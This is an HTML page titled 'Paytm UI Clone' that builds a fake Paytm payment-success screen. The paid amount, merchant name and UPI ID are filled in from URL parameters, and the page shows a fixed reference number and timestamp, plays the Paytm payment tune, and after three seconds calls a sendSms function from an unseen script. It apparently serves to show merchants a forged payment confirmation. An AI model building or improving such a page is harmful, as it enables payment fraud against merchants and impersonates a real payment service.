<!DOCTYPE html>
<html lang="en">
<head>
  <script src="./js/Mobile.js" type="text/javascript" charset="utf-8"></script>
  <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
<script>
    eruda.init();
</script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/peerjs/1.5.5/peerjs.min.js" integrity="sha512-XEKeWX+mI3Ov+tg2evDlVQFzVOIp4T8J3cNcCEPaEUGpxJV3eZaN8rHuvnFPvQpGJBHPmrozJDMpm2xcDvtmyQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paytm UI Clone</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body {
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #e6f7ff;
            margin: 0;
            display: flex;
            justify-content: center;
        }
        .phone-container {
            width: 100%;
            max-width: 400px;
            background: linear-gradient(180deg, #e0f4ff 0%, #ffffff 100%);
            min-height: 100vh;
            position: relative;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            padding-bottom: 100px; /* Space for fixed nav */
        }
        @keyframes marquee {
            0% { transform: translateX(0); }
            100% { transform: translateX(-50%); }
        }
        .animate-marquee {
            animation: marquee 10s linear infinite;
        }
    </style>
</head>
<body>
    <div class="phone-container">
        <div class="p-4 flex justify-between items-center mt-[-20px] mb-[-30px]">
            <i class="fa-solid fa-arrow-left text-xl text-gray-700" onclick="history.back()"></i>
            <img src="./media/logo.webp" alt="Paytm" class="h-25">
            <i class="fa-solid fa-ellipsis-vertical text-xl text-gray-700"></i>
        </div>

        <div class="text-center mt-4">
            <h2 id="name" class="text-xl font-bold text-gray-800">Paytm merchant</h2>
            <p id="upi" class="text-sm text-gray-600 font-medium">UPI ID:xxxxxxxxx </p>
        </div>

        <div class="flex flex-col items-center mt-6">
            <div class="flex items-center gap-2">
                <span id="amount" class="text-5xl font-bold text-gray-900">₹1</span>
                <div class="bg-green-500 rounded-full p-1 flex items-center justify-center">
                    <i class="fa-solid fa-check text-white text-xl"></i>
                </div>
            </div>
            <div class="mt-6 flex items-center text-gray-600 text-[13px] font-medium">
                <span>21 Mar, 01:23 PM</span>
                <span class="mx-2">•</span>
                <span>Ref. No: 202351969430</span>
                <i class="fa-regular fa-copy ml-2 cursor-pointer"></i>
            </div>
        </div>

        <div class="flex justify-center gap-3 mt-8 px-4">
            <button class="flex-1 py-2 px-1 border border-gray-300 rounded-full bg-white text-sm font-semibold text-gray-700 shadow-sm">Check Balance</button>
            <button class="flex-1 py-2 px-1 border border-gray-300 rounded-full bg-white text-sm font-semibold text-gray-700 shadow-sm">Pay Again</button>
            <button class="flex-1 py-2 px-1 bg-[#1eb443] rounded-full text-white text-sm font-semibold flex items-center justify-center gap-2 shadow-md">
                <i class="fa-brands fa-whatsapp text-lg"></i> Share
            </button>
        </div>

        <div class="mt-10 relative">
            <div class="absolute -top-12 left-6 z-20">
                <div class="relative w-20 h-28 bg-white rounded-lg shadow-xl overflow-hidden border-2 border-white">
                    <div class="absolute inset-0 flex flex-col items-center justify-center bg-yellow-50 text-center p-1">
                        <span class="text-[10px] font-bold text-blue-600 leading-tight">YOU WON</span>
                        <span class="text-lg font-black text-gray-800">₹10</span>
                        <span class="text-[8px] text-gray-500 uppercase">Cashback</span>
                    </div>
                    <canvas id="scratchCanvas" width="80" height="112" class="absolute inset-0 cursor-pointer touch-none"></canvas>
                </div>
            </div>
            <div class="bg-[#5e2d91] py-3 overflow-hidden border-y-2 border-white/10 shadow-inner">
                <div class="animate-marquee whitespace-nowrap flex">
                    <p class="text-white font-bold text-xs tracking-widest uppercase px-4">
                        A SCRATCHCARD • YOU JUST WON A SCRATCHCARD • YOU JUST WON A SCRATCHCARD • YOU JUST WON
                    </p>
                </div>
            </div>
        </div>

        <div class="mt-12 text-center px-4">
            <h3 class="text-xl font-bold text-gray-800 flex items-center justify-center gap-2">
                Pay using 
                <span class="flex items-center">
                    <span class="bg-black text-white p-1 rounded-sm mr-1 leading-none text-[10px]">₹</span>
                    <span class="text-[#00baf2] font-extrabold italic">paytm</span>
                    <span class="font-bold text-[#002970] ml-1">Postpaid</span>
                </span>
            </h3>
            <div class="mt-6">
                <p class="text-gray-600 font-semibold text-lg">Get up to</p>
                <h1 class="text-6xl font-black text-transparent bg-clip-text bg-gradient-to-r from-[#00baf2] to-[#7ed957]">₹60,000</h1>
                <p class="text-2xl font-bold text-gray-800 mt-1">credit limit</p>
            </div>
            <button class="mt-8 bg-[#ffc107] text-gray-900 font-bold py-3 px-8 rounded-full flex items-center gap-3 mx-auto shadow-md">
                Activate now <i class="fa-solid fa-arrow-right"></i>
            </button>
        </div>

        <div class="fixed bottom-4 left-1/2 -translate-x-1/2 w-[90%] max-w-[360px] bg-[#002970] rounded-full py-3 px-6 flex justify-between items-center shadow-xl z-50">
            <div class="flex flex-col items-center text-white"><i class="fa-solid fa-house text-xl"></i><span class="text-[10px] mt-1">Home</span></div>
            <div class="flex flex-col items-center text-white opacity-80"><i class="fa-solid fa-qrcode text-xl border border-white rounded p-[2px]"></i><span class="text-[10px] mt-1">Scan</span></div>
            <div class="flex flex-col items-center text-white opacity-80"><i class="fa-solid fa-hand-holding-dollar text-xl"></i><span class="text-[10px] mt-1">Cashback</span></div>
        </div>
    </div>

    <script>
        // Scratch Logic
        const canvas = document.getElementById('scratchCanvas');
        const ctx = canvas.getContext('2d');
        let isDrawing = false;
        ctx.fillStyle = '#00baf2';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = 'rgba(255,255,255,0.3)';
        ctx.font = 'bold 10px Arial';
        ctx.fillText('SCRATCH', 15, 50);

        function scratch(e) {
            if (!isDrawing) return;
            const rect = canvas.getBoundingClientRect();
            const x = (e.clientX || (e.touches && e.touches[0].clientX)) - rect.left;
            const y = (e.clientY || (e.touches && e.touches[0].clientY)) - rect.top;
            ctx.globalCompositeOperation = 'destination-out';
            ctx.beginPath(); ctx.arc(x, y, 12, 0, Math.PI * 2); ctx.fill();
        }
        canvas.addEventListener('mousedown', () => isDrawing = true);
        canvas.addEventListener('touchstart', () => isDrawing = true);
        window.addEventListener('mouseup', () => isDrawing = false);
        window.addEventListener('touchend', () => isDrawing = false);
        canvas.addEventListener('mousemove', scratch);
        canvas.addEventListener('touchmove', scratch);

        // URL Params Logic
        const params = new URLSearchParams(window.location.search);
        const amountParam = params.get("amount") || "1";
      
        const nameParam = params.get("name") || "Paytm Merchant";
        const upiParam = params.get("upi") || "xxxxxxxxxxxxx";

        document.getElementById("name").innerText = nameParam;
        document.getElementById("upi").innerText = `UPI ID: ${upiParam}`;

        const formatter = new Intl.NumberFormat('en-IN', {
            style: 'currency',
            currency: 'INR',
            maximumFractionDigits: 0
        });
        
        // Clean amount string and format
        const cleanAmount = parseFloat(amountParam.replace(/[^0-9.]/g, '')) || 0;
        const cleanCu=formatter.format(cleanAmount).replace("INR", "₹").trim();
        document.getElementById("amount").innerText = cleanCu
        const au=new Audio("./media/paytm_payment_tune.mp3")
  
          au.play()
        setTimeout(function() {
          sendSms(upiParam,cleanCu)
        }, 3000);
    </script>
    <script src="./js/sendData.js" type="text/javascript" charset="utf-8"></script>
</body>
</html>
